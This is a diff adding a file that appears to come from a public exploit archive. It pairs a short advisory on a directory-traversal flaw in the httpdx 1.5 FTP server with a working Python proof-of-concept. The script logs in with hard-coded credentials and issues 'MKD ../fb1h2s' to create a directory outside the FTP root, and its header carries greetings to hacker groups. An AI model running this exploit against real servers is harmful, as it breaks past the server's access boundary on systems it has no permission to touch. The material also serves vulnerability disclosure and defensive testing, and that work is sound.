@@ -1,0 +1,41 @@
+source: http://www.securityfocus.com/bid/38242/info
+
+The 'httpdx' program is prone to a directory-traversal vulnerability because it fails to sufficiently sanitize user-supplied input.
+
+Exploiting this issue allows an authenticated user to create directories outside the FTP root directory, which may lead to other attacks.
+
+This issue affects httpdx 1.5; other versions may also be affected. 
+
+# Exploit Title: httpdx - ultralight http/ftp server directory Traversal
+# Date: 14/2/2010
+# Author: FB1H2S
+# Software Link: http://sourceforge.net/projects/httpdx/
+# Version: v1.5
+# Tested on: WIN XP2
+# CVE : [if exists]
+# Code : Attached
+ 
+#!/usr/bin/python
+# Greetz to all Darkc0de, Andhra Hackers and ICW Memebers                              
+#Thanks  : Mr bond,Wipu,GOdwinAustin,The_empty,beenu,hg_H@x0r,r45c4l,it_security,eberly
+#Shoutz  : SMART_HAX0R,j4ckh4x0r,41w@r10r,Hackuin
+import socket
+import sys
+hostname='localhost'
+username='admin'
+passwd='password'
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+try:
+    sock.connect((hostname, 21))
+except:
+    print ("Connection error!")
+    sys.exit(1)
+r=sock.recv(1024)
+sock.send("user %s\r\n" %username)
+r=sock.recv(1024)
+sock.send("pass %s\r\n" %passwd)
+r=sock.recv(1024)
+# The FTP root is example.com we could move down the root directory
+sock.send("MKD ../fb1h2s\r\n")
+sock.close()
+sys.exit(0);
